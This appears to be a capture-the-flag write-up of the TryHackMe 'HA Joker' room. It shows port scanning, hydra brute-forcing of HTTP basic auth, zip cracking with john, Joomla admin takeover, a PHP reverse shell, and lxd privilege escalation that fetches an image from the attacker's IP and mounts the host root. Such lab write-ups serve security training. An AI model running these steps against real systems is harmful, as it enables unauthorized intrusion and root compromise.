## HA Joker CTF
https://tryhackme.com/room/jokerctf

## Enum
```
nmap -Pn -sC -sV -sT ip.thm -A -vv

Scanning ip.thm (10.10.144.125) [1000 ports]
Discovered open port 22/tcp on 10.10.144.125
Discovered open port 80/tcp on 10.10.144.125
Discovered open port 8080/tcp on 10.10.144.125

PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 ad:20:1f:f4:33:1b:00:70:b3:85:cb:87:00:c4:f4:f7 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDL89x6yGLD8uQ9HgFK1nvBGpjT6KJXIwZZ56/pjgdRK/dOSpvl0ckMaa68V9bLHvn0Oerh2oa4Q5yCnwddrQnm7JHJ4gNAM+lg+ML7+cIULAHqXFKPpPAjvEWJ7T6+NRrLc9q8EixBsbEPuNer4tGGyUJXg6GpjWL5jZ79TwZ80ANcYPVGPZbrcCfx5yR/1KBTcpEdUsounHjpnpDS/i+2rJ3ua8IPUrqcY3GzlDcvF7d/+oO9GxQ0wjpy1po6lDJ/LytU6IPFZ1Gn/xpRsOxw0N35S7fDuhn69XlXj8xiDDbTlOhD4sNxckX0veXKpo6ynQh5t3yM5CxAQdqRKgFF
|   256 1b:f9:a8:ec:fd:35:ec:fb:04:d5:ee:2a:a1:7a:4f:78 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOzF9YUxQxzgUVsmwq9ZtROK9XiPOB0quHBIwbMQPScfnLbF3/Fws+Ffm/l0NV7aIua0W7FLGP3U4cxZEDFIzfQ=
|   256 dc:d7:dd:6e:f6:71:1f:8c:2c:2c:a1:34:6d:29:99:20 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPLWfYB8/GSsvhS7b9c6hpXJCO6p1RvLsv4RJMvN4B3r
80/tcp   open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
|_http-title: HA: Joker
| http-methods:
|_  Supported Methods: HEAD GET POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
8080/tcp open  http    syn-ack Apache httpd 2.4.29
|_http-title: 401 Unauthorized
| http-auth:
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=Please enter the password.
|_http-server-header: Apache/2.4.29 (Ubuntu)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).


nmap -Pn ip.thm -p- --open --min-rate 1000
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-05 01:57 JST
Nmap scan report for ip.thm (10.10.144.125)
Host is up (0.42s latency).
Not shown: 65474 closed tcp ports (reset), 58 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8080/tcp open  http-proxy
```

```
 ffuf -u http://ip.thm/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -e .php,.htm,.bak,.txt,.log -fc 403
________________________________________________

css                     [Status: 301, Size: 298, Words: 20, Lines: 10, Duration: 445ms]
img                     [Status: 301, Size: 298, Words: 20, Lines: 10, Duration: 439ms]
index.html              [Status: 200, Size: 5954, Words: 783, Lines: 97, Duration: 439ms]
phpinfo.php             [Status: 200, Size: 94820, Words: 4706, Lines: 1160, Duration: 587ms]
phpinfo.php             [Status: 200, Size: 94820, Words: 4706, Lines: 1160, Duration: 650ms]
secret.txt              [Status: 200, Size: 320, Words: 62, Lines: 7, Duration: 434ms]
:: Progress: [28278/28278] :: Job [1/1] :: 79 req/sec :: Duration: [0:05:24] :: Errors: 0 ::
```
```
curl ip.thm/secret.txt
Batman hits Joker.
Joker: "Bats you may be a rock but you won't break me." (Laughs!)
Batman: "I will break you with this rock. You made a mistake now."
Joker: "This is one of your 100 poor jokes, when will you get a sense of humor bats! You are dumb as a rock."
Joker: "HA! HA! HA! HA! HA! HA! HA! HA! HA! HA! HA! HA!"
```
```
hydra -l joker -P /usr/share/wordlists/rockyou.txt ip.thm http-get -s 8080
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-09-05 21:40:15
[WARNING] You must supply the web page as an additional option or via -m, default path set to /
[INFO] Using HTTP Proxy: http://127.0.0.1:8082
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-get://ip.thm:8080/
[8080][http-get] host: ip.thm   login: joker   password: hannah
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-09-05 21:41:03
```
🏴 I got p8080 Basic Auth credential.

```
   ____  _____  _____  __  __  ___   ___    __    _  _
   (_  _)(  _  )(  _  )(  \/  )/ __) / __)  /__\  ( \( )
  .-_)(   )(_)(  )(_)(  )    ( \__ \( (__  /(__)\  )  (
  \____) (_____)(_____)(_/\/\_)(___/ \___)(__)(__)(_)\_)
                        (1337.today)

    --=[OWASP JoomScan
    +---++---==[Version : 0.0.7
    +---++---==[Update Date : [2018/09/23]
    +---++---==[Authors : Mohammad Reza Espargham , Ali Razmjoo
    --=[Code name : Self Challenge
    @OWASP_JoomScan , @rezesp , @Ali_Razmjo0 , @OWASP

Processing http://ip.thm:8080/ ...



[+] FireWall Detector
[++] Firewall not detected

[+] Detecting Joomla Version
[++] Joomla 3.7.0

[+] Core Joomla Vulnerability
[++] Target Joomla core is not vulnerable

[+] Checking apache info/status files
[++] Readable info/status files are not found

[+] admin finder
[++] Admin page : http://ip.thm:8080/administrator/

[+] Checking robots.txt existing
[++] robots.txt is found
path : http://ip.thm:8080/robots.txt

Interesting path found from robots.txt
http://ip.thm:8080/joomla/administrator/
http://ip.thm:8080/administrator/
http://ip.thm:8080/bin/
http://ip.thm:8080/cache/
http://ip.thm:8080/cli/
http://ip.thm:8080/components/
http://ip.thm:8080/includes/
http://ip.thm:8080/installation/
http://ip.thm:8080/language/
http://ip.thm:8080/layouts/
http://ip.thm:8080/libraries/
http://ip.thm:8080/logs/
http://ip.thm:8080/modules/
http://ip.thm:8080/plugins/
http://ip.thm:8080/tmp/


[+] Finding common backup files name
[++] Backup files are not found

[+] Finding common log files name
[++] error log is not found

[+] Checking sensitive config.php.x file
[++] Readable config files are not found


Your Report : reports/ip.thm:8080/
```

![2](https://user-images.githubusercontent.com/6504854/188606123-3c7dd30e-994d-4a5f-a1e4-8d22920e493c.PNG)

```
unzip backup.zip
Archive:  backup.zip
[backup.zip] db/joomladb.sql password:

john2zip backup.zip > hash

john hash
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 8 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/john/password.lst
hannah           (backup.zip)
1g 0:00:00:00 DONE 2/3 (2022-09-06 00:16) 11.11g/s 1140Kp/s 1140Kc/s 1140KC/s 123456..faithfaith
Use the "--show" option to display all of the cracked passwords reliably

cd db 
cat joomladb.sql | grep user
```
![4](https://user-images.githubusercontent.com/6504854/188606638-348f40f6-8cfd-4fa8-a163-b20f2c8be1b5.PNG)
![6](https://user-images.githubusercontent.com/6504854/188606900-e9bf7014-fc8d-4674-8ba3-a5463bd32271.PNG)
![image](https://user-images.githubusercontent.com/6504854/188607624-a2adaf46-e9cf-4719-bcae-7981b3b4dbbb.png)

🏴 I got admin credential, loggined and wrote php reverse shell over. 

## Flag
```
listening on [any] 4444 ...
Linux ubuntu 4.15.0-55-generic #60-Ubuntu SMP Tue Jul 2 18:22:20 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
 09:12:28 up  5:06,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data),115(lxd)
$ sudo -l
sudo: no tty present and no askpass program specified
$ ls /home
joker
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@ubuntu:/$ su joker
su joker
Password: hannah

su: Authentication failure
www-data@ubuntu:/$ su joker
su joker
Password: abcd1234

su: Authentication failure

www-data@ubuntu:/$ find / -user joker -type f 2>/dev/null
find / -user joker -type f 2>/dev/null
/home/joker/.bash_history
/home/joker/.bash_logout
/home/joker/.sudo_as_admin_successful
/home/joker/.bashrc
/home/joker/.profile
www-data@ubuntu:/$ cat /home/joker/.bash_history
cat /home/joker/.bash_history
cat: /home/joker/.bash_history: Permission denied

www-data@ubuntu:/$ ls -la /usr/bin/pkexec
ls -la /usr/bin/pkexec
ls: cannot access '/usr/bin/pkexec': No such file or directory

www-data@ubuntu:/$ cd tmp
cd tmp
www-data@ubuntu:/tmp$ www-data@ubuntu:/$ wget 10.4.63.222/alpine-v3.13-x86_64-20210218_0139.tar.gz
<0.4.63.222/alpine-v3.13-x86_64-20210218_0139.tar.gz
bash: www-data@ubuntu:/$: No such file or directory
www-data@ubuntu:/tmp$ ls
ls
www-data@ubuntu:/tmp$ wget http://10.4.63.222/alpine-v3.13-x86_64-20210218_0139.tar.gz
www-data@ubuntu:/tmp$ ls
ls
alpine-v3.13-x86_64-20210218_0139.tar.gz
www-data@ubuntu:/tmp$ lxc image import ./alpine-v3.13-x86_64-20210218_0139.tar.gz
<e import ./alpine-v3.13-x86_64-20210218_0139.tar.gz

www-data@ubuntu:/tmp$ lxc image list
lxc image list
+-------+--------------+--------+-------------------------------+--------+--------+-----------------------------+
| ALIAS | FINGERPRINT  | PUBLIC |          DESCRIPTION          |  ARCH  |  SIZE  |         UPLOAD DATE
|
+-------+--------------+--------+-------------------------------+--------+--------+-----------------------------+
|       | cd73881adaac | no     | alpine v3.13 (20210218_01:39) | x86_64 | 3.11MB | Sep 5, 2022 at 4:31pm (UTC) |
+-------+--------------+--------+-------------------------------+--------+--------+-----------------------------+

www-data@ubuntu:/tmp$ lxc init cd73881adaac ignite -c security.privileged=true
<nit cd73881adaac ignite -c security.privileged=true
Creating ignite

www-data@ubuntu:/tmp$ lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
<ydevice disk source=/ path=/mnt/root recursive=true
Device mydevice added to ignite

www-data@ubuntu:/tmp$ lxc start ignite
lxc start ignite

www-data@ubuntu:/tmp$ lxc exec ignite /bin/sh
lxc exec ignite /bin/sh
~ # ^[[50;5R ls -a /root
 ls -a /root
.             ..            .ash_history
~ # ^[[50;5Rcd root

cd /root
~ # ^[[50;5Rls -la
ls -la
total 12
drwx------    2 root     root          4096 Sep  5 16:33 .
drwxr-xr-x   19 root     root          4096 Sep  5 16:33 ..
-rw-------    1 root     root           100 Sep  5 16:36 .ash_history
~ # ^[[50;5Rcd /mnt/root

cd /mnt/root
/mnt/root # ls
ls
bin             lib             root            usr
boot            lib64           run             var
dev             lost+found      sbin            vmlinuz
etc             media           srv             vmlinuz.old
home            mnt             swapfile
initrd.img      opt             sys
initrd.img.old  proc            tmp
/mnt/root # ^[[50;13Rcd /mnt

cd /mnt
/mnt # ^[[50;8Rls -la
ls -la
total 12
drwxr-xr-x    3 root     root          4096 Sep  5 16:33 .
drwxr-xr-x   19 root     root          4096 Sep  5 16:33 ..
drwxr-xr-x   22 root     root          4096 Oct 22  2019 root
/mnt # ^[[50;8Rcd root

cd root
/mnt/root # ^[[50;13Rls -la
ls -la
total 970056
drwxr-xr-x   22 root     root          4096 Oct 22  2019 .
drwxr-xr-x    3 root     root          4096 Sep  5 16:33 ..
-rw-------    1 root     root             0 Oct 22  2019 .bash_history
drwxr-xr-x    2 root     root          4096 Oct  8  2019 bin
drwxr-xr-x    3 root     root          4096 Oct  8  2019 boot
drwxr-xr-x   17 root     root          3700 Sep  5 11:06 dev
drwxr-xr-x   85 root     root          4096 Oct 25  2019 etc
drwxr-xr-x    3 root     root          4096 Oct  8  2019 home
lrwxrwxrwx    1 root     root            33 Oct  8  2019 initrd.img -> boot/initrd.img-4.15.0-55-generic
lrwxrwxrwx    1 root     root            33 Oct  8  2019 initrd.img.old -> boot/initrd.img-4.15.0-55-generic
drwxr-xr-x   20 root     root          4096 Oct  8  2019 lib
drwxr-xr-x    2 root     root          4096 Oct  8  2019 lib64
drwx------    2 root     root         16384 Oct  8  2019 lost+found
drwxr-xr-x    4 root     root          4096 Oct  8  2019 media
drwxr-xr-x    2 root     root          4096 Aug  5  2019 mnt
drwxr-xr-x    3 root     root          4096 Oct  8  2019 opt
dr-xr-xr-x  115 root     root             0 Sep  5 11:05 proc
drwx------    5 root     root          4096 Oct 25  2019 root
drwxr-xr-x   21 root     root           680 Sep  5 16:31 run
drwxr-xr-x    2 root     root          4096 Oct  8  2019 sbin
drwxr-xr-x    2 root     root          4096 Aug  5  2019 srv
-rw-------    1 root     root     993244160 Oct  8  2019 swapfile
dr-xr-xr-x   13 root     root             0 Sep  5 11:05 sys
drwxrwxrwt   11 root     root          4096 Sep  5 16:31 tmp
drwxr-xr-x   10 root     root          4096 Oct  8  2019 usr
drwxr-xr-x   12 root     root          4096 Oct  8  2019 var
lrwxrwxrwx    1 root     root            30 Oct  8  2019 vmlinuz -> boot/vmlinuz-4.15.0-55-generic
lrwxrwxrwx    1 root     root            30 Oct  8  2019 vmlinuz.old -> boot/vmlinuz-4.15.0-55-generic

/mnt/root # ^[[50;13Rcd root
cd root

/mnt/root/root # ^[[50;18Rls -la
ls -la
total 40
drwx------    5 root     root          4096 Oct 25  2019 .
drwxr-xr-x   22 root     root          4096 Oct 22  2019 ..
-rw-------    1 root     root            40 Oct 25  2019 .bash_history
-rw-r--r--    1 root     root          3106 Apr  9  2018 .bashrc
drwx------    2 root     root          4096 Oct 22  2019 .cache
drwxr-x---    3 root     root          4096 Oct 24  2019 .config
drwxr-xr-x    3 root     root          4096 Oct  8  2019 .local
-rw-------    1 root     root            33 Oct 24  2019 .mysql_history
-rw-r--r--    1 root     root           148 Aug 17  2015 .profile
-rw-r--r--    1 root     root          1003 Oct  8  2019 final.txt
/mnt/root/root # ^[[50;18Rcat final.txt
cat final.txt

     ██╗ ██████╗ ██╗  ██╗███████╗██████╗
     ██║██╔═══██╗██║ ██╔╝██╔════╝██╔══██╗
     ██║██║   ██║█████╔╝ █████╗  ██████╔╝
██   ██║██║   ██║██╔═██╗ ██╔══╝  ██╔══██╗
╚█████╔╝╚██████╔╝██║  ██╗███████╗██║  ██║
 ╚════╝  ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝

!! Congrats you have finished this task !!

Contact us here:

Hacking Articles : https://twitter.com/rajchandel/
Aarti Singh: https://in.linkedin.com/in/aarti-singh-353698114

+-+-+-+-+-+ +-+-+-+-+-+-+-+
 |E|n|j|o|y| |H|A|C|K|I|N|G|
 +-+-+-+-+-+ +-+-+-+-+-+-+-+
/mnt/root/root # ^[[50;18R
```
https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation

## Omake
ffufでProxy通した（Burp）ときにsizeがでかいからかtimeoutしてるようでDefaultのtimeout値(10)で取りこぼしてbackup.zipが探せなかった。。
:cry::cry::cry:

![image](https://user-images.githubusercontent.com/6504854/188610269-c3394ef2-a58c-4c5b-8e66-483be9a7863e.png)
![image](https://user-images.githubusercontent.com/6504854/188610601-9707f877-bb9e-48fc-a6d7-ad9e2c27f970.png)
![3](https://user-images.githubusercontent.com/6504854/188776399-0ddbbe4e-64b2-4fe4-8231-42080ea88f18.PNG)

rustbusterいってみっかー

Thank you for your time. Happy Hacking 😄










